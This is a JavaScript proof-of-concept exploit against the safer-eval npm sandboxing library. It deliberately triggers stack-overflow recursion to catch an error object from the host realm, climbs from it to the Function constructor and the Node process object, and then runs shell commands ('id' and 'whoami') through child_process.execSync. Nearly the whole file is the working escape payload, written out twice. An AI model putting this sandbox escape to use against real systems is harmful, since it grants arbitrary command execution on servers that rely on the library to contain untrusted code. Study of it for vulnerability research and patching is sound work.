const saferEval = require('safer-eval'); // 2019.7/WORKER1 找到一个很棒的库
const theFunction = function () {
  const f = Buffer.prototype.write;
  const ft = {
    length: 10,
    utf8Write(){

    }
  };
  function r(i){
    var x = 0;
    try{
      x = r(i);
    }catch(e){}
    if(typeof(x)!=='number')
      return x;
    if(x!==i)
      return x+1;
    try{
      f.call(ft);
    }catch(e){
      return e;
    }
    return null;
  }
  var i=1;
  while(1){
    try{
      i=r(i).constructor.constructor("return process")();
      break;
    }catch(x){
      i++;
    }
  }
  return i.mainModule.require("child_process").execSync("id").toString()
};
const untrusteda = `(${theFunction})()`;
const untrusted=`(function () {
  const f = Buffer.prototype.write;
  const ft = {
    length: 10,
    utf8Write(){

    }
  };
  function r(i){
    var x = 0;
    try{
      x = r(i);
    }catch(e){}
    if(typeof(x)!=='number')
      return x;
    if(x!==i)
      return x+1;
    try{
      f.call(ft);
    }catch(e){
      return e;
    }
    return null;
  }
  var i=1;
  while(1){
    try{
      i=r(i).constructor.constructor("return process")();
      break;
    }catch(x){
      i++;
    }
  }
  return i.mainModule.require("child_process").execSync("whoami").toString()
})()`;
String(untrusted)
// console.log(String(untrusteda))
// console.log(String(untrusteda)==untrusted)
console.log(saferEval(String(untrusted)));